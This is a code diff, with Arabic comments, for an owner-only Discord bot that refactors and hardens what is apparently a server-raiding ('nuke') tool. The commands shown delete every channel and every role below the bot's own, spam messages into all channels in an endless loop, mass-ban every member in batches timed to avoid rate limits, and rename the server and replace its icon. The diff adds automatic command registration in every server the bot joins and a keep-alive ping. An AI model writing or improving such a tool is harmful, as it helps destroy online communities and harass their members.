@@ -1,5 +1,6 @@
 const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, ChannelType, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 const http = require('http');
+const https = require('https');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
@@ -14,6 +15,7 @@ const client = new Client({
 });
 
 const activeOperations = new Map();
+const registeredGuilds = new Set(); // تتبع السيرفرات المسجلة
 
 const commands = [
     new SlashCommandBuilder()
@@ -110,58 +112,81 @@ const commands = [
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 
 async function registerCommands(guildId) {
+    // لو مسجل قبل، لا تسجل مرة ثانية
+    if (registeredGuilds.has(guildId)) {
+        console.log(`⏭️ السيرفر ${guildId} مسجل مسبقاً`);
+        return true;
+    }
+    
     try {
-        console.log(`جاري تسجيل الأوامر في السيرفر: ${guildId}...`);
-        await rest.put(
+        console.log(`📝 جاري تسجيل الأوامر في: ${guildId}`);
+        const data = await rest.put(
             Routes.applicationGuildCommands(CLIENT_ID, guildId),
             { body: commands }
         );
-        console.log(`✅ تم تسجيل الأوامر بنجاح في السيرفر: ${guildId}!`);
+        console.log(`✅ تم تسجيل ${data.length} أمر في: ${guildId}`);
+        registeredGuilds.add(guildId);
+        return true;
     } catch (error) {
-        console.error(`❌ خطأ في تسجيل الأوامر في السيرفر ${guildId}:`, error);
+        console.error(`❌ فشل التسجيل في ${guildId}:`, error.message);
+        return false;
     }
 }
 
+// ===== READY =====
 client.once('ready', async () => {
     console.log(`✅ البوت شغال: ${client.user.tag}`);
+    console.log(`📊 عدد السيرفرات: ${client.guilds.cache.size}`);
     
-    // تسجيل الأوامر في جميع السيرفرات الموجودة
+    // تسجيل في جميع السيرفرات الموجودة
     for (const guild of client.guilds.cache.values()) {
         await registerCommands(guild.id);
     }
+    
+    // ===== فحص دوري كل 30 ثانية للسيرفرات الجديدة =====
+    setInterval(async () => {
+        console.log('🔍 فحص السيرفرات...');
+        for (const guild of client.guilds.cache.values()) {
+            if (!registeredGuilds.has(guild.id)) {
+                console.log(`🆕 سيرفر جديد detected: ${guild.name}`);
+                await registerCommands(guild.id);
+            }
+        }
+    }, 30 * 1000); // كل 30 ثانية
+    
+    console.log('🔄 الفحص الدوري مفعل (كل 30 ثانية)');
 });
 
-// ===== تسجيل الأوامر تلقائياً لما البوت يدخل سيرفر جديد =====
+// ===== GUILD CREATE (احتياطي) =====
 client.on('guildCreate', async (guild) => {
-    try {
-        console.log(`🆕 البوت انضم لسيرفر جديد: ${guild.name} (${guild.id})`);
-        await registerCommands(guild.id);
-        console.log(`✅ تم تفعيل أوامر السلاش بنجاح في سيرفر: ${guild.name}`);
-    } catch (error) {
-        console.error(`❌ فشل رفع الأوامر للسيرفر الجديد ${guild.name}:`, error);
-    }
+    console.log(`🆕 [guildCreate] انضمام: ${guild.name} (${guild.id})`);
+    await registerCommands(guild.id);
 });
 
-// ===== التحقق من المالك فقط =====
-function isOwner(userId) {
-    return userId === OWNER_ID;
+// ===== التحقق من المالك =====
+async function denyAccess(interaction) {
+    if (interaction.user.id === OWNER_ID) return false;
+    
+    try {
+        if (interaction.replied || interaction.deferred) {
+            await interaction.followUp({ 
+                content: '❌ هذا البوت خاص بـ <@' + OWNER_ID + '> فقط ولا يمكنك استخدامه.', 
+                flags: 64 
+            });
+        } else {
+            await interaction.reply({ 
+                content: '❌ هذا البوت خاص بـ <@' + OWNER_ID + '> فقط ولا يمكنك استخدامه.', 
+                flags: 64 
+            });
+        }
+    } catch (e) {}
+    return true;
 }
 
 client.on('interactionCreate', async (interaction) => {
+    const denied = await denyAccess(interaction);
+    if (denied) return;
 
-    // ===== التحقق من المالك لجميع التفاعلات (أزرار + أوامر) =====
-    if (interaction.user.id !== OWNER_ID) {
-        const replyMethod = interaction.replied || interaction.deferred 
-            ? 'followUp' 
-            : 'reply';
-        
-        return interaction[replyMethod]({ 
-            content: '❌ هذا البوت خاص بـ <@' + OWNER_ID + '> فقط ولا يمكنك استخدامه.', 
-            flags: 64 
-        });
-    }
-
-    // ===== معالجة الأزرار =====
     if (interaction.isButton()) {
         const opId = interaction.customId.replace('stop_', '');
         if (activeOperations.has(opId)) {
@@ -172,10 +197,8 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (!interaction.isChatInputCommand()) return;
-
     const { commandName } = interaction;
 
-    // ===== حذف جميع الروومات =====
     if (commandName === 'delete-rooms') {
         await interaction.deferReply({ flags: 64 });
         const keepRoom = interaction.options.getChannel('keep-room');
@@ -189,7 +212,6 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply(`✅ تم حذف **${deleted}** روم بنجاح.${keepMsg}`);
     }
 
-    // ===== إضافة روومات =====
     else if (commandName === 'add-room') {
         const name = interaction.options.getString('name');
         const count = interaction.options.getInteger('count');
@@ -218,18 +240,15 @@ client.on('interactionCreate', async (interaction) => {
         try { await interaction.editReply({ content: `✅ تم إنشاء **${created}** روم.`, components: [] }); } catch (e) {}
     }
 
-    // ===== سبام في جميع الروومات =====
     else if (commandName === 'spam') {
         const message = interaction.options.getString('message');
         const imageUrl = interaction.options.getString('image');
-
         if (!message && !imageUrl) {
             return interaction.reply({ content: '❌ لازم تحط نص أو صورة!', flags: 64 });
         }
 
         const opId = `spam_${interaction.id}`;
         activeOperations.set(opId, true);
-
         const stopButton = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId(`stop_${opId}`)
@@ -237,7 +256,7 @@ client.on('interactionCreate', async (interaction) => {
                 .setStyle(ButtonStyle.Danger)
         );
 
-        await interaction.reply({ content: `⚙️ جاري إرسال الرسائل في جميع الروومات...`, components: [stopButton], flags: 64 });
+        await interaction.reply({ content: `⚙️ جاري الإرسال...`, components: [stopButton], flags: 64 });
 
         let sent = 0;
         while (activeOperations.get(opId)) {
@@ -258,7 +277,6 @@ client.on('interactionCreate', async (interaction) => {
         try { await interaction.editReply({ content: `✅ تم إرسال **${sent}** رسالة.`, components: [] }); } catch (e) {}
     }
 
-    // ===== باند =====
     else if (commandName === 'ban') {
         await interaction.deferReply({ flags: 64 });
         const user = interaction.options.getUser('user');
@@ -266,11 +284,10 @@ client.on('interactionCreate', async (interaction) => {
         const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
         try {
             await interaction.guild.members.ban(user, { deleteMessageDays: days, reason });
-            await interaction.editReply(`✅ تم باند **${user.tag}** | السبب: ${reason} | حذف رسائل: ${days} يوم`);
-        } catch (e) { await interaction.editReply(`❌ فشل الباند: ${e.message}`); }
+            await interaction.editReply(`✅ تم باند **${user.tag}** | السبب: ${reason}`);
+        } catch (e) { await interaction.editReply(`❌ فشل: ${e.message}`); }
     }
 
-    // ===== باند جماعي سريع =====
     else if (commandName === 'mass-ban') {
         await interaction.deferReply({ flags: 64 });
         const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
@@ -278,12 +295,9 @@ client.on('interactionCreate', async (interaction) => {
             const members = await interaction.guild.members.fetch();
             let banned = 0;
             let batch = [];
-            
             for (const member of members.values()) {
-                if (member.id === interaction.user.id) continue;
-                if (member.id === client.user.id) continue;
+                if (member.id === interaction.user.id || member.id === client.user.id) continue;
                 batch.push(member);
-                
                 if (batch.length === 15) {
                     for (const m of batch) {
                         try { await m.ban({ reason }); banned++; } catch (e) {}
@@ -292,20 +306,17 @@ client.on('interactionCreate', async (interaction) => {
                     await new Promise(r => setTimeout(r, 1000));
                 }
             }
-            
             for (const m of batch) {
                 try { await m.ban({ reason }); banned++; } catch (e) {}
             }
-            
             await interaction.editReply(`✅ تم باند **${banned}** عضو | السبب: ${reason}`);
-        } catch (e) { await interaction.editReply(`❌ فشل الباند الجماعي: ${e.message}`); }
+        } catch (e) { await interaction.editReply(`❌ فشل: ${e.message}`); }
     }
 
-    // ===== حذف جميع الرولات =====
     else if (commandName === 'delete-roles') {
         await interaction.deferReply({ flags: 64 });
         const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
-        const roles = interaction.guild.roles.cache.filter(r => r.name !== '@everyone');
+        const roles = interaction.guild.roles.cache.filter(r => r.name !== '@everyone' && r.position < interaction.guild.members.me.roles.highest.position);
         let deleted = 0;
         for (const role of roles.values()) {
             try { await role.delete(reason); deleted++; } catch (e) {}
@@ -313,45 +324,45 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply(`✅ تم حذف **${deleted}** رول | السبب: ${reason}`);
     }
 
-    // ===== تغيير اسم السيرفر =====
     else if (commandName === 'change-server-name') {
         await interaction.deferReply({ flags: 64 });
         const newName = interaction.options.getString('name');
         try {
             await interaction.guild.setName(newName);
-            await interaction.editReply(`✅ تم تغيير اسم السيرفر إلى: **${newName}**`);
-        } catch (e) {
-            await interaction.editReply(`❌ فشل تغيير الاسم: ${e.message}`);
-        }
+            await interaction.editReply(`✅ تم تغيير الاسم إلى: **${newName}**`);
+        } catch (e) { await interaction.editReply(`❌ فشل: ${e.message}`); }
     }
 
-    // ===== تغيير أيقونة السيرفر =====
     else if (commandName === 'change-server-icon') {
         await interaction.deferReply({ flags: 64 });
         const iconUrl = interaction.options.getString('icon-url');
         try {
             await interaction.guild.setIcon(iconUrl);
-            await interaction.editReply(`✅ تم تغيير أيقونة السيرفر بنجاح!`);
-        } catch (e) {
-            await interaction.editReply(`❌ فشل تغيير الأيقونة: ${e.message}`);
-        }
+            await interaction.editReply(`✅ تم تغيير الأيقونة بنجاح!`);
+        } catch (e) { await interaction.editReply(`❌ فشل: ${e.message}`); }
     }
 });
 
-// ===== سيرفر HTTP لـ Render =====
-http.createServer((req, res) => res.end('Bot is running!')).listen(process.env.PORT || 3000);
+// ===== HTTP Server =====
+const PORT = process.env.PORT || 3000;
+http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('Bot is running on Railway!');
+}).listen(PORT, () => {
+    console.log(`🌐 HTTP Server شغال على البورت: ${PORT}`);
+});
 
 // ===== Keep Alive =====
-setInterval(() => {
-    fetch('https://bot-dragon.onrender.com').catch(() => {});
-}, 4 * 60 * 1000);
+const RAILWAY_URL = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN;
+if (RAILWAY_URL) {
+    setInterval(() => {
+        https.get(`https://${RAILWAY_URL}`, (res) => {}).on('error', () => {});
+    }, 4 * 60 * 1000);
+    console.log(`🔄 Keep Alive مفعل`);
+}
 
-process.on('unhandledRejection', (reason) => {
-    console.error('❌ [Anti-Crash]:', reason);
-});
-
-process.on("uncaughtException", (err) => {
-    console.error('❌ [Anti-Crash]:', err);
-});
+// ===== Anti Crash =====
+process.on('unhandledRejection', (reason) => console.error('❌ [Anti-Crash]:', reason));
+process.on("uncaughtException", (err) => console.error('❌ [Anti-Crash]:', err));
 
 client.login(TOKEN);
